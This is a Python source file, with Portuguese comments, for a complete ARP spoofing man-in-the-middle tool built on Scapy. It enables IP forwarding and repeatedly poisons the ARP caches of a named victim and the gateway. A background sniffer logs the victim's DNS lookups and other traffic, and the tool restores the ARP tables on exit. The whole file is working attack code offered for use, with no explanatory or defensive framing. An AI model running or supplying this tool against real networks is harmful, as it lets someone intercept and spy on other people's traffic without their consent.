from scapy.all import ARP, Ether, send, sniff, srp, conf, DNSQR, DNSRR
import time
import sys
import threading
import os

conf.verb = 0
conf.iface = None

# Ativa o IP forwarding. Obs Somente Linux
# Para Windows: use "netsh interface ipv4 set interface "Wi-fi" forwarding=enabled"
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP Forwarding ativado")

def get_mac(ip):
    try:
        arp = ARP(pdst=ip)
        ether = Ether(dst='ff:ff:ff:ff:ff:ff')
        answered = srp(ether/arp, timeout=3, retry=3, verbose=False)[0]
        return answered[0][1].hwsrc if answered else None
    except:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return False
    
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    return True

def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac and gateway_mac:
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=7, verbose=False)
        print(f"[+] ARP de {target_ip} restaurado")

def get_protocol_name(proto):
    return {1: "ICMP", 2: "IGMP", 6: "TCP", 17: "UDP"}.get(proto, proto)

def packet_callback(packet):
    # Função chamada para cada pacote capturado
    try:
        if not packet.haslayer("IP"):
            return
        
        src = packet["IP"].src
        dst = packet["IP"].dst
        proto = get_protocol_name(packet["IP"].proto)

        # Se for DNS Query
        if packet.haslayer(DNSQR):
            domain = packet[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
            print(f"[DNS Query] {src:15} → {dst:15} | {domain}")
                
        # Se for DNS Response
        elif packet.haslayer(DNSRR):
            domain = packet[DNSRR].rrname.decode('utf-8', errors='ignore').rstrip('.')
            print(f"[DNS Answer] {src:15} → {dst:15} | {domain}")

        # Outros pacotes (mostra só a cada 8 pacotes para não poluir muito)
        elif packet.haslayer("TCP") or packet.haslayer("UDP"):
            if getattr(packet_callback, "counter", 0) % 8 == 0:
                print(f"[{proto:3}] {src:15} → {dst:15}")
            packet_callback.counter = getattr(packet_callback, "counter", 0) + 1

    except:
        pass

def start_sniffer(target_ip, count=0): # count=0 significa ilimitado
    print(f"[+] Sniffer iniciado (capturando tráfego de {target_ip}")
    print("[+] Pressione Ctrl+C para parar o ataque\n")
    sniff(filter=f"host {target_ip}", prn=packet_callback, count=count, store=False)


def main():
    if len(sys.argv) != 4:
        print(f"Use: sudo python ARP-Spoofer.py <target_ip> <gateway_ip> <interface>")
        print(f"Ex: sudo python ARP-Spoofer.py 192.168.1.100 192.168.1.1 eth0")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]

    conf.iface = interface
    enable_ip_forwarding()

    print(f"[+] ARP Spoofing INICIADO")
    print(f"    Vítima    : {target_ip}")
    print(f"    Gateway   : {gateway_ip}")
    print(f"    Interface : {interface}")
    print("=" * 80)

    sniffer_thread = threading.Thread(target=start_sniffer, args=(target_ip,), daemon=True)
    sniffer_thread.start()

    try:
        packets_sent = 0
        while True:
            spoof(target_ip, gateway_ip) # Diz para a vítima que eu sou o gateway
            spoof(gateway_ip, target_ip) # Diz para o gateway que eu sou a vítima
            packets_sent += 2

            if packets_sent % 30 == 0:
                print(f"[+] ARP Spoofing ativo | Pacotes enviados: {packets_sent}", end="\r")
            time.sleep(1.8)

    except KeyboardInterrupt:
        print("\n\n[!] Parando o ataque e restaurando à rede...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Rede restaurada com sucesso.")

if __name__ == "__main__":
    main()